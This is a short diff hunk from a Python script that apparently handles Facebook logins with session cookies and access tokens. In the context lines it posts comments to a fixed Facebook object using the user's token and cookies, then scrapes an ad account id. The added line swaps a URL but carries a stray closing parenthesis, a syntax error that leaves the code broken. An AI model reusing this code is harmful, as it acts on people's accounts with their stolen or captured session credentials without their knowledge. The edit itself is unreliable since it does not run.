@@ -480,7 +480,7 @@ def login_lagi334():
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok}", headers = {"cookie":your_cookies})
 									try:
 										cookies = {'cookie':your_cookies}
-										url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+										url = 'https://business.facebook.com/business_locations')
 										req = ses.get(url,cookies=cookies)
 										set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
 										nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
